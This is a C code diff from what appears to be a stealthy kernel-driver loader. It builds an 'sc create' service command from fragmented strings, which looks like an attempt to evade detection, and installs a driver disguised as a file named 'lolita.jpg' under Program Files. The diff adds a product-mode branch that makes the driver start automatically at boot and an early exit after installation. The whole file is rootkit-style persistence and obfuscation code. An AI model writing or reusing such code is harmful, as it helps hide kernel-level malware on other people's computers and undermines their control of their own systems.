@@ -39,11 +39,14 @@ void extractDriver() {
 }
 
 void installDriver() {
-    strcmp("111", "2222");
+    system("sc delete kimg");
     //"sc create LRM type= kernel start= demand binPath=C:\\LRM.sys"
     char xs[120];
     //printf("Just a fucking string\n");
     sprintf(xs, "s%stype= ke%ssta%sb%s\\Program Files\\lolita.%s", "c create kimg ", "rnel ", "rt= demand ", "inPath= \"C:", "jpg\"");
+    if (PRODUCT_MODE) {
+        sprintf(xs, "s%stype= ke%ssta%sb%s\\Program Files\\lolita.%s", "c create kimg ", "rnel ", "rt= auto ", "inPath= \"C:", "jpg\"");
+    }
     printf("%s\n", xs);
     system(xs);
     
@@ -62,6 +65,9 @@ int main()
     extractDriver();
     //NMSL_TEST);
     installDriver();
+    if (PRODUCT_MODE) {
+        return 0;
+    }
     //system("pause");
     //system("sc stop kimg");
     //system("pause");
